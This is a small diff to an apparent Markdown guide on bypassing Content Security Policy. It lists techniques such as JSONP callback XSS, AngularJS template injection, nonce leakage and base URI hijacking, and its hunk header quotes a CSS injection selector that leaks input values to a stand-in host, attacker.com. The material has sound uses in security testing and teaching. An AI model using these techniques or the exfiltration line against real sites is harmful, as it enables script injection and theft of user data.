@@ -212,7 +212,7 @@ input[value^="b"] { background: url("https://attacker.com/?char=b"); }
 ## Common Scenarios
 
 1. **JSONP Callback XSS** — Exploit JSONP endpoints on whitelisted CDN domains to execute JavaScript callbacks containing XSS payloads
-2. **AngularJS Sandbox Escape** — Load AngularJS from whitelisted CDN and use template injection to bypass CSP script restrictions
+2. **AngularJS Escape** — Load AngularJS from whitelisted CDN and use template injection to bypass CSP script restrictions
 3. **Nonce Leakage** — Extract CSP nonce values through CSS injection or DOM clobbering to inject scripts with valid nonces
 4. **Base URI Hijacking** — Inject base element to redirect all relative script loads to attacker-controlled server
 5. **Report-Only Exploitation** — Identify CSP in report-only mode where violations are logged but not blocked, enabling direct XSS
